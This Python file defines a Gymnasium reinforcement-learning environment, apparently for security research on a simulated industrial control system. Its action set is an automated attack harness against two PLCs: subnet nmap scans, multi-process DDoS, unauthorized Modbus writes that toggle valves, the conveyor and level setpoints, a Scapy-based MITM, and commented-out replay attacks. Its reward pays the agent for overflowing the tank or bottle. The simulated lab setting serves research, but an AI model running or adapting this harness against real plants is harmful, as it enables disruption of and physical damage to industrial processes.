import gymnasium as gym
from gymnasium import spaces
import numpy as np
from ics_sim.protocol import ModbusBase
from ics_sim.connectors import SQLiteConnector, MemcacheConnector, ConnectorFactory
from Configs import TAG, Connection
from pyModbusTCP.client import ModbusClient
import subprocess
import random
import os
import math
import time

class IcssimEnviroment(gym.Env):
    def __init__(self, first_plc_ip="192.168.0.11", second_plc_ip="192.168.0.12", plc_port=502):
        super(IcssimEnviroment, self).__init__()

        self.firstPLC = ModbusClient(first_plc_ip, plc_port)
        self.secondPLC = ModbusClient(second_plc_ip, plc_port)
        self.modbus = ModbusBase(2, 4)
        self.connectionSQL = SQLiteConnector(Connection.SQLITE_CONNECTION)
        self.connectionMemcache = MemcacheConnector(Connection.MEMCACHE_LOCAL_CONNECTION)
        self.connectionMemcacheDocker = MemcacheConnector(Connection.MEMCACHE_DOCKER_CONNECTION)
        self.connectionConnectionFactory = ConnectorFactory.build(Connection.MEMCACHE_LOCAL_CONNECTION)

        self.max_episode_steps = 10
        self.current_step = 0

        # TAG_LIST con i parametri iniziali
        self.TAG_LIST = {
            TAG.TAG_TANK_INPUT_VALVE_STATUS,
            TAG.TAG_TANK_INPUT_VALVE_MODE,
            TAG.TAG_TANK_LEVEL_VALUE,
            TAG.TAG_TANK_LEVEL_MIN,
            TAG.TAG_TANK_LEVEL_MAX,
            TAG.TAG_TANK_OUTPUT_VALVE_STATUS,
            TAG.TAG_TANK_INPUT_VALVE_MODE,
            TAG.TAG_TANK_OUTPUT_FLOW_VALUE,
            TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS,
            TAG.TAG_CONVEYOR_BELT_ENGINE_MODE,
            TAG.TAG_BOTTLE_LEVEL_VALUE,
            TAG.TAG_BOTTLE_LEVEL_MAX,
            TAG.TAG_BOTTLE_DISTANCE_TO_FILLER_VALUE,
        }

        self.observation_space = spaces.Box(low=0, high=20, shape=(13,), dtype=np.float32)
        self.action_space = spaces.Discrete(12, start=0) 
        self.metadata = {}
        self.render_mode = None
        self.reward_range = (-math.inf, math.inf)
        self.spec = None
        self.valore_simulatore = self.get_real_time_data()

    def step(self, action):
        reward = 0
        self.current_step += 1
        terminated = False
        truncated = False

        self.valore_simulatore = self.get_real_time_data()
        valvola_ingresso_stato = self.valore_simulatore[0]  # Stato della valvola di ingresso del serbatoio (0: OFF, 1: ON)
        valvola_ingresso_modalità = self.valore_simulatore[1]  # Modalità della valvola di ingresso del serbatoio (1: OFF, 2: ON, 3: AUTO)
        livello_serbatoio = self.valore_simulatore[2]  # Livello del serbatoio
        livello_serbatoio_min = self.valore_simulatore[3]  # Livello minimo del serbatoio
        livello_serbatoio_max = self.valore_simulatore[4]  # Livello massimo del serbatoio
        valvola_uscita_stato = self.valore_simulatore[5]  # Stato della valvola di uscita del serbatoio (0: OFF, 1: ON)
        valvola_uscita_modalità = self.valore_simulatore[6]  # Modalità della valvola di uscita del serbatoio (1: OFF, 2: ON, 3: AUTO)
        flusso_valvola_uscita = self.valore_simulatore[7]  # Flusso della valvola di uscita del serbatoio
        motore_nastro_stato = self.valore_simulatore[8]  # Stato del motore del nastro trasportatore (0: OFF, 1: ON)
        motore_nastro_modalità = self.valore_simulatore[9]  # Modalità del motore del nastro trasportatore (1: OFF, 2: ON, 3: AUTO)
        livello_bottiglia = self.valore_simulatore[10]  # Livello della bottiglia
        livello_max_bottiglia = self.valore_simulatore[11]  # Livello massimo della bottiglia
        distanza_bottiglia_riempitore = self.valore_simulatore[12]  # Distanza della bottiglia dal riempitore
        
        off = 1
        on = 2
        auto = 3

        if action == 0:
            target = "192.168.0.1/24"
            bash_command = ['nmap',
                '-p-',
                target]
            subprocess.run(bash_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            # reward = reward - 0
            print("Scansione Nmap")
        elif action == 1: # DDOS primo PLC
            print("DDos primo PLC")
            ddos_agent_path = 'DDosAgent.py'
            timeout = 10
            num_process = 10
            target = '192.168.0.11'
            processes_args = []
            processes = []
            log_file_directory = '/tmp'
            if not os.path.exists(log_file_directory):
                os.makedirs(log_file_directory)
            for i in range(num_process):
                log_file_path = os.path.join(log_file_directory, f'log_agent{i}.txt')
                command = f'python3 {ddos_agent_path} Agent{i} --timeout {timeout} --target {target} --log_path {log_file_path}'
                processes_args.append(command.split(' '))
            for i in range(num_process):
                process = subprocess.Popen(processes_args[i], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                processes.append(process)
            for process in processes:
                process.communicate()
            # reward = reward - 0
        elif action == 2: # Input tank ON
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_STATUS)['id']), self.modbus.encode(1))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(2))
            print("Input tank ON")
            # reward = reward + 1 if valvola_ingresso_modalità != on else reward - 1
        elif action == 3: # Output tank su ON 
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_STATUS)['id']), self.modbus.encode(1))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus.encode(2))
            print("Output tank su ON")
            # reward = reward + 1 if valvola_uscita_modalità != on else reward - 1
        elif action == 4: # Nastro trasportatore su ON
            self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS)['id']), self.modbus.encode(1))
            self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus.encode(2))
            print("Nastro trasportatore su ON")
            # reward = reward + 1 if motore_nastro_modalità != on else reward - 1
        elif action == 5: # Nastro trasportatore su OFF
            self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus.encode(1))
            # reward = reward + 1 if motore_nastro_modalità != off else reward - 1
            print("Nastro trasportatore su OFF")
        elif action == 6: # Output tank su OFF
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus.encode(1))
            # reward = reward + 1 if valvola_uscita_modalità != off else reward - 1
            print("Output tank su OFF")
        elif action == 7: # Input tank OFF
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(1))
            # reward = reward + 1 if valvola_ingresso_modalità != off else reward - 1
            print("Input tank OFF")
        elif action == 8: # DDos secondo PLC 
            print("DDos secondo PLC")
            ddos_agent_path = 'DDosAgent.py'
            timeout = 10
            num_process = 10
            target = '192.168.0.12'
            processes_args = []
            processes = []
            log_file_directory = '/tmp'
            if not os.path.exists(log_file_directory):
                os.makedirs(log_file_directory)
            for i in range(num_process):
                log_file_path = os.path.join(log_file_directory, f'log_agent{i}.txt')
                command = f'python3 {ddos_agent_path} Agent{i} --timeout {timeout} --target {target} --log_path {log_file_path}'
                processes_args.append(command.split(' '))
            for i in range(num_process):
                process = subprocess.Popen(processes_args[i], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                processes.append(process)
            for process in processes:
                process.communicate()
            # reward = reward - 0
        elif action == 9:
            rand3 = random.randint(0, 4)
            self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_MAX)['id']), self.modbus.encode(rand3))
            # reward = reward + 0 if livello_max_bottiglia != rand3 else reward - 1
            print(f"Capacità massima della bottiglia impostata a: {rand3}")
        elif action == 10: # Regolazione dei valori di massimo e di minimo in modo casuale
            rand1 = random.randint(0, 5)
            rand2 = random.randint(5, 10)
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MIN)['id']), self.modbus.encode(rand1))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MAX)['id']), self.modbus.encode(rand2))
            # reward = reward + 1 if livello_serbatoio_min != rand1 and livello_serbatoio_max != rand2 else reward - 1
            print(f"Tank level MIN: {rand1}, MAX: {rand2}")
        # elif action == 13: # Replay attack tra HMI2 e il primo PLC
            #     print("Replay attack tra HMI2 e il primo PLC")
            #     timeout = 15
            #     replay_count = 3
            #     target='192.168.0.11,192.168.0.22'
            #     log_file_directory = '/tmp'
            #     if not os.path.exists(log_file_directory):
            #         os.makedirs(log_file_directory)
            #     log_file_path = os.path.join(log_file_directory, f'log_replay.txt')
            #     bash_command = ['python3',
            #         'ics_sim/ScapyAttacker.py',
            #         '--attack', 'replay',
            #         '--output', log_file_path,
            #         '--timeout', str(timeout),
            #         '--parameter', str(replay_count),
            #         '--target', target]
            #     print(bash_command)
            #     subprocess.run(bash_command)
            #     reward = reward + rewards_map.get(action, 13)
            #     break
        # elif action == 14: # Replay attack tra HMI1 e il primo PLC
            #     print("Replay attack tra HMI1 e il primo PLC")
            #     timeout = 15
            #     replay_count = 3
            #     target='192.168.0.11,192.168.0.21'
            #     log_file_directory = '/tmp'
            #     if not os.path.exists(log_file_directory):
            #         os.makedirs(log_file_directory)
            #     log_file_path = os.path.join(log_file_directory, f'log_replay.txt')
            #     bash_command = ['python3',
            #         'ics_sim/ScapyAttacker.py',
            #         '--attack', 'replay',
            #         '--output', log_file_path,
            #         '--timeout', str(timeout),
            #         '--parameter', str(replay_count),
            #         '--target', target]
            #     print(bash_command)
            #     subprocess.run(bash_command)
            #     reward = reward + rewards_map.get(action, 14)
            #     break
        # elif action == 15: # Replay attack tra HMI2 e il secondo PLC
            #     print("Replay attack tra HMI2 e il secondo PLC")
            #     timeout = 15
            #     replay_count = 3
            #     target='192.168.0.12,192.168.0.22'
            #     log_file_directory = '/tmp'
            #     if not os.path.exists(log_file_directory):
            #         os.makedirs(log_file_directory)
            #     log_file_path = os.path.join(log_file_directory, f'log_replay.txt')
            #     bash_command = ['python3',
            #         'ics_sim/ScapyAttacker.py',
            #         '--attack', 'replay',
            #         '--output', log_file_path,
            #         '--timeout', str(timeout),
            #         '--parameter', str(replay_count),
            #         '--target', target]
            #     print(bash_command)
            #     subprocess.run(bash_command)
            #     reward = reward + rewards_map.get(action, 15)
            #     break
        # elif action == 16: # Replay attack tra HMI1 e il secondo PLC
            #     print("Replay attack tra HMI1 e il secondo PLC")
            #     timeout = 15
            #     replay_count = 3
            #     target='192.168.0.12,192.168.0.21'
            #     log_file_directory = '/tmp'
            #     if not os.path.exists(log_file_directory):
            #         os.makedirs(log_file_directory)
            #     log_file_path = os.path.join(log_file_directory, f'log_replay.txt')
            #     bash_command = ['python3',
            #         'ics_sim/ScapyAttacker.py',
            #         '--attack', 'replay',
            #         '--output', log_file_path,
            #         '--timeout', str(timeout),
            #         '--parameter', str(replay_count),
            #         '--target', target]
            #     print(bash_command)
            #     subprocess.run(bash_command)
            #     reward = reward + rewards_map.get(action, 16)
            #     break
        elif action == 11: # Attacco MITM (da cambiare nello script)
            print("Attacco MITM su 192.168.0.1/24")
            timeout= 10
            noise= 0.1
            target='192.168.0.1/24'
            log_file_directory = '/tmp'
            if not os.path.exists(log_file_directory):
                os.makedirs(log_file_directory)
            log_file_path = os.path.join(log_file_directory, f'log_mitm.txt')
            subprocess.run(['echo', '0'], stdout=open('/proc/sys/net/ipv4/ip_forward',"w"))
            bash_command = ['python3',
                            'ics_sim/ScapyAttacker.py',
                            '--attack', 'mitm',
                            '--output', log_file_path,
                            '--timeout', str(timeout),
                            '--parameter', str(noise),
                            '--target', target]
            print(bash_command)
            subprocess.run(bash_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(['echo', '1'], stdout=open('/proc/sys/net/ipv4/ip_forward',"w"))
            # reward = reward + 0
        
        self.valore_simulatore = self.get_real_time_data()
        valvola_ingresso_stato = self.valore_simulatore[0]  # Stato della valvola di ingresso del serbatoio (0: OFF, 1: ON)
        valvola_ingresso_modalità = self.valore_simulatore[1]  # Modalità della valvola di ingresso del serbatoio (1: OFF, 2: ON, 3: AUTO)
        livello_serbatoio = self.valore_simulatore[2]  # Livello del serbatoio
        livello_serbatoio_min = self.valore_simulatore[3]  # Livello minimo del serbatoio
        livello_serbatoio_max = self.valore_simulatore[4]  # Livello massimo del serbatoio
        valvola_uscita_stato = self.valore_simulatore[5]  # Stato della valvola di uscita del serbatoio (0: OFF, 1: ON)
        valvola_uscita_modalità = self.valore_simulatore[6]  # Modalità della valvola di uscita del serbatoio (1: OFF, 2: ON, 3: AUTO)
        flusso_valvola_uscita = self.valore_simulatore[7]  # Flusso della valvola di uscita del serbatoio
        motore_nastro_stato = self.valore_simulatore[8]  # Stato del motore del nastro trasportatore (0: OFF, 1: ON)
        motore_nastro_modalità = self.valore_simulatore[9]  # Modalità del motore del nastro trasportatore (1: OFF, 2: ON, 3: AUTO)
        livello_bottiglia = self.valore_simulatore[10]  # Livello della bottiglia
        livello_max_bottiglia = self.valore_simulatore[11]  # Livello massimo della bottiglia
        distanza_bottiglia_riempitore = self.valore_simulatore[12]  # Distanza della bottiglia dal riempitore

        if self.current_step == self.max_episode_steps:
            truncated = True
        if livello_serbatoio < livello_serbatoio_min or livello_serbatoio > livello_serbatoio_max:
            reward = reward + 10
            terminated = True
        if livello_bottiglia > livello_max_bottiglia:
            reward = reward + 10
            terminated = True
        if terminated == False or truncated == False or truncated == True:
            reward = reward - 1
        
        observation = self.valore_simulatore

        info = {}

        return observation, reward, terminated, truncated, info


    def get_real_time_data(self):
        response = []
        # response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_STATUS)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_VALUE)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MIN)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MAX)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_STATUS)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.firstPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_FLOW_VALUE)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_VALUE)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_MAX)['id']), self.modbus._word_num)))
        # response.append(self.modbus.decode(self.secondPLC.read_holding_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_DISTANCE_TO_FILLER_VALUE)['id']), self.modbus._word_num)))
        response.append(self.connectionSQL.get(TAG.TAG_TANK_INPUT_VALVE_STATUS))
        response.append(self.connectionSQL.get(TAG.TAG_TANK_INPUT_VALVE_MODE))
        response.append(self.connectionSQL.get(TAG.TAG_TANK_LEVEL_VALUE))
        response.append(self.connectionSQL.get(TAG.TAG_TANK_LEVEL_MIN))
        response.append(self.connectionSQL.get(TAG.TAG_TANK_LEVEL_MAX))
        response.append(self.connectionSQL.get(TAG.TAG_TANK_OUTPUT_VALVE_STATUS))
        response.append(self.connectionSQL.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE))
        response.append(self.connectionSQL.get(TAG.TAG_TANK_OUTPUT_FLOW_VALUE))
        response.append(self.connectionSQL.get(TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS))
        response.append(self.connectionSQL.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE))
        response.append(self.connectionSQL.get(TAG.TAG_BOTTLE_LEVEL_VALUE))
        response.append(self.connectionSQL.get(TAG.TAG_BOTTLE_LEVEL_MAX))
        response.append(self.connectionSQL.get(TAG.TAG_BOTTLE_DISTANCE_TO_FILLER_VALUE))
        return np.array(response, dtype=np.float32)

    
    def reset(self, seed=None, options=None):
        
        self.current_step = 0

        print("Sto resettando l'ambiente!")
        start_time = time.time()
        while (time.time() - start_time) < 5:
            self.connectionSQL.set(TAG.TAG_TANK_LEVEL_VALUE, 5.8)
            self.connectionSQL.set(TAG.TAG_BOTTLE_LEVEL_VALUE, 0)

            self.connectionMemcache.set(TAG.TAG_TANK_LEVEL_VALUE, 5.8)
            self.connectionMemcache.set(TAG.TAG_BOTTLE_LEVEL_VALUE, 0)
            
            self.connectionMemcacheDocker.set(TAG.TAG_TANK_LEVEL_VALUE, 5.8)
            self.connectionMemcacheDocker.set(TAG.TAG_BOTTLE_LEVEL_VALUE, 0)

            self.connectionConnectionFactory.set(TAG.TAG_TANK_LEVEL_VALUE, 5.8)
            self.connectionConnectionFactory.set(TAG.TAG_BOTTLE_LEVEL_VALUE, 0)
            
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_STATUS)['id']), self.modbus.encode(1))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_INPUT_VALVE_MODE)['id']), self.modbus.encode(3))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MIN)['id']), self.modbus.encode(3))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_LEVEL_MAX)['id']), self.modbus.encode(7))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_STATUS)['id']), self.modbus.encode(0))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_VALVE_MODE)['id']), self.modbus.encode(3))
            self.firstPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_TANK_OUTPUT_FLOW_VALUE)['id']), self.modbus.encode(0))
            self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS)['id']), self.modbus.encode(0))
            self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE)['id']), self.modbus.encode(3))
            self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_LEVEL_MAX)['id']), self.modbus.encode(1.8))
            self.secondPLC.write_multiple_registers(self.modbus.get_registers(TAG.TAG_LIST.get(TAG.TAG_BOTTLE_DISTANCE_TO_FILLER_VALUE)['id']), self.modbus.encode(0))
            
        print("Ambiente resettato!")

        self.valore_simulatore = self.get_real_time_data()
        observation = self.valore_simulatore
        info = {}
        return observation, info

    def render(self, mode='human'):
        if mode == 'human':
            print("Stato corrente del sistema:")
            for tag_name, tag_info in self.TAG_LIST.items():
                print(f"{tag_name}: {self.valore_simulatore[tag_info['id']]}")
        elif mode == 'rgb_array':
            pass
        else:
            super(IcssimEnviroment, self).render(mode=mode)

    def close(self):
        pass
